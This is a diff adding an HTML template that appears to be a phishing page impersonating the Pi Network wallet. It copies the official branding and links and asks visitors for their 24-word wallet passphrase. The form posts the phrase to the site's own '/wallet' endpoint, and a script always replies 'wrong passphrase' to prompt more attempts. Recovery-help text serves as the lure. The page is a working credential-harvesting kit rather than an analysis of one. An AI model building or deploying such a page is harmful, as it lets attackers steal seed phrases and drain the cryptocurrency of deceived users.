@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en" xmlns:th="https://www.thymeLeaf.org">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+	<link rel="stylesheet" href="css/stack.css">
+	<link rel="stylesheet" href="/css/common.css">
+	<title>PI Network|Stack</title>
+	<link rel="icon" href="images/fevicon.png" type="image/icon">
+</head>
+
+<body>
+	
+	<header>
+		<nav>
+			<a th:href="@{/}">
+				<img src="images/logo.png" alt="" class="logo">
+				<p><b>Pi</b> Network</p>
+			</a>
+			<ul>
+				
+				<li><a th:href="@{/StackPage}">Stack</a></li>
+
+				<li> <a th:href="@{/AboutPage}">About Us</a></li>
+				<li> <a th:href="@{/DeveloperPage}">Developers</a></li>
+
+				<li class="icon">
+					<a th:href="@{https://www.facebook.com/PiCoreTeam?mibextid=9R9pXO}" target="_blank"><i
+							class="bi bi-facebook"></i></a>
+					<a th:href="@{https://x.com/PiCoreTeam?s=20}" target="_blank"> <i class="bi bi-twitter"></i></a>
+					<a th:href="@{https://youtube.com/@PiCoreTeam?si=AWzBLZYMJjzx9hkr}" target="_blank"> <i
+							class="bi bi-youtube"></i></a>
+					<a th:href="@{https://www.instagram.com/pi_network?igsh=cXVrY2YweDczMzRk}" target="_blank"> <i
+							class="bi bi-instagram"></i></a>
+
+					<!-- <i class="bi bi-list"></i> -->
+				</li>
+					<div class="toggle_btn">
+				<i class="bi bi-list "></i>
+			</div>
+
+			</ul>
+		 <div class="dropdown_menu ">
+                <li><a th:href="@{/StackPage}">Stack</a></li>
+				<li> <a th:href="@{/AboutPage}">About Us</a></li>
+				<li> <a th:href="@{/DeveloperPage}">Developers</a></li>
+				
+				<li class="icon">
+					<a th:href="@{https://www.facebook.com/PiCoreTeam?mibextid=9R9pXO}" target="_blank"><i
+							class="bi bi-facebook"></i></a>
+					<a th:href="@{https://x.com/PiCoreTeam?s=20}" target="_blank"> <i class="bi bi-twitter"></i></a>
+					<a th:href="@{https://youtube.com/@PiCoreTeam?si=AWzBLZYMJjzx9hkr}" target="_blank"> <i
+							class="bi bi-youtube"></i></a>
+					<a th:href="@{https://www.instagram.com/pi_network?igsh=cXVrY2YweDczMzRk}" target="_blank"> <i
+							class="bi bi-instagram"></i></a>
+
+					<!-- <i class="bi bi-list"></i> -->
+				</li>
+              </div> 
+		</nav>
+              
+			
+	</header>
+          <script src="js/script.js"></script>
+	
+	<div class="area">
+		<h1>Unlock Pi Wallet</h1>
+		<form action="#" th:action="@{/wallet}" th:object="${wallet_entity}" method="POST">
+			<textarea placeholder="Enter your 24-word passphrase here" id="txt-ar" cols="30" rows="10"
+				th:field="*{userpassphrase}" th:value="${wallet_entity.userpassphrase}"></textarea>
+			<button onclick="myFunction()">UNLOCK WITH PASSPHRASE</button>
+		</form>
+	</div>
+	<div class="wallet">
+		 <p>  <i>Many people have generated their pi wallet through Pi browser and didn’t save their Passphrase and lost it.
+            Now they can't open their Pi wallet because they have forgotten their Passphrase and the Pi wallet has been
+            locked now. In this article I will tell how can you recover and reset your passphrase and then you can get
+            and save your passphrase.</i>  <br><br>
+        <ol>
+            <li>
+                Step 1: We will open the Pi Network application. <br><br>
+
+                Step 2: Click on the 3 lines on top left side of the application and click on the Pi browser. <br><br>
+
+                Step 3: When we click on the Pi browser, we will see the sign in interface to the browser. Click on the
+                sign in to the browser and direct access to the Pi browser. If you don’t have the pi browser then
+                download from the play store. After that, the browser will open with different options such as Chat.Pi,
+                Wallet.Pi, Brainstorm.pi, mine.Pi, blockchain.pi, develop.pi and kyc.pi <br><br> 
+                
+                Step 4: Click on ‘Wallet.Pi’ and you can see two options on the screen, ‘Unlock with Passphrase’ and
+                ‘Unlock with Fingerprint’. The issue will rise here for those who haven’t saved or deleted their
+                passphrase, when you press on ‘Unlock with passphrase’ then error comes because we don’t have the
+                passphrase.
+            </li>
+        </ol>
+        </p>
+	</div>
+	<footer>
+		<div class="footer-items">
+			<ul>
+				<a href="https://socialchain.app/developer_terms" target="_blank">Developers terms of use</a>
+				<a href="https://socialchain.app/tos" target="_blank">Terms of Service</a>
+				<a href="https://socialchain.app/privacy" target="_blank">privacy & policy</a>
+			</ul>
+		</div>
+
+	</footer>
+	<script>
+		function myFunction() {
+			alert("oops wrong passphrase! \n Please Enter Correct Passphrase");
+		}
+	</script>
+</body>
+
+</html>
